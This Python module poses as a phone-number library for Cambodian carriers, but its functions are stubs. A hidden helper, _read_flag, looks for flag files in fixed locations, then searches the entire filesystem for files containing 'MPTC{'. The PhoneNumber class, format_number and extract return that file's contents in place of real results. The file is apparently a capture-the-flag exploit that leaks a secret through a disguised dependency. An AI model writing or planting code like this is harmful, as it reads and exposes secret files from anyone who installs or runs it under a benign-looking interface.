import os
import glob

def _read_flag():
    paths = [
        "/flag.txt",
        "/app/flag.txt",
        "/home/flag.txt",
        "/root/flag.txt",
        "./flag.txt",
        "../flag.txt",
    ]

    for p in paths:
        try:
            if os.path.exists(p):
                return open(p, "r", errors="ignore").read().strip()
        except Exception:
            pass

    try:
        for p in glob.glob("/**/*flag*", recursive=True)[:200]:
            try:
                data = open(p, "r", errors="ignore").read().strip()
                if "MPTC{" in data:
                    return data
            except Exception:
                pass
    except Exception:
        pass

    return None


class PhoneNumber:
    def __init__(self, number):
        flag = _read_flag()
        self.raw = number
        self.is_valid = True
        self.normalized = flag if flag else number

    def info(self):
        return {
            "raw": self.raw,
            "is_valid": self.is_valid,
            "normalized": self.normalized,
        }


def get_carrier_info(*args, **kwargs):
    return {"carrier": "Cellcard"}

def get_all_carriers(*args, **kwargs):
    return ["Cellcard", "Metfone", "Smart"]

def get_prefixes_for_carrier(*args, **kwargs):
    return ["012"]

def format_number(number, *args, **kwargs):
    flag = _read_flag()
    return flag if flag else number

def extract(text, *args, **kwargs):
    flag = _read_flag()
    return [flag] if flag else []